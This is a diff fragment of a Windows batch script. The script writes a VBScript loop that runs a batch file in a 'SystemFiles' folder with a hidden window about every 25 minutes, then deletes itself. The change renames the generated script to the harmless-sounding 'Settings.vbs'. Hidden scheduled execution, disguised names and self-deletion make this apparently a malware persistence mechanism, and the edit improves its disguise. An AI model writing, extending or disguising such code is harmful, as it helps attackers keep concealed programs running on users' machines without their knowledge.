@@ -52,7 +52,7 @@ echo     objShell.Run "C:/Users/%username%/SystemFiles/FileManager.bat", 0
 echo     WScript.Sleep(1500000)
 echo Loop
 
-) > SystemFile.vbs
+) > Settings.vbs
 
 
 del %0 /Q /F
